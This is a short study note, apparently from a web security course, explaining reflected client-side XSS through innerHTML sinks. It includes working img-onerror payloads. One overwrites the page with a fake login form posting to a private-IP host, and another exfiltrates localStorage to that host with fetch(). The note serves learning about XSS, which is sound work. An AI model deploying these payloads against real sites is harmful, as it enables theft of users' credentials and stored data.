---
tags:
- xss
---

# Reflected Client XSS

Reflected client XSS - is a XSS attack when an attacker sends payload from victim request to the server and server append this payload to the response and then this payload executes in Java Script functions.  Payload activates on client side. 

It is likes reflected server XSS but payload is not in DOM, payload located in JS functions and will have been added in DOM  by JS code. 

**Example**: 
Application uses construction like: 
```js
document.getElementById("welcome").innerHTML = "Welcome, " + params.name;
```
HTML5 specifies that a <\script> tag inserted with innerHTML should not execute. [[2023042618315454 Reflected Client XSS#^a9d7eb]]
But we can use another construction to execute js code, like this:
```html
<img src='x' onerror='alert(1)'>
```

Example of stealing password using img
```html
<img src='x' onerror='let formHtml = `<form action="http://192.168.49.55" method="get"><input type="text" class="form-control" id="floatingInput" placeholder="name@example.com" name="username"><input type="password" class="form-control" id="floatingPassword" placeholder="Password" name="password"></form>`;document.getElementsByTagName("body")[0].innerHTML = formHtml;'>
```

Stealing local storage
```html
<img src='x' onerror='let data = JSON.stringify(localStorage); let encodedData = encodeURIComponent(data); fetch("http://192.168.49.55/localStorage?data=".concat(encodedData));'>
```
## How attacker sends payload tho the victim request 
1. Through an  email, chat message or link to another site
## References
1. web200.Cross-Site Scripting Introduction and Discovery.Reflected Client XSS
2.   (Mozilla, 2021), [https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML)  ^a9d7eb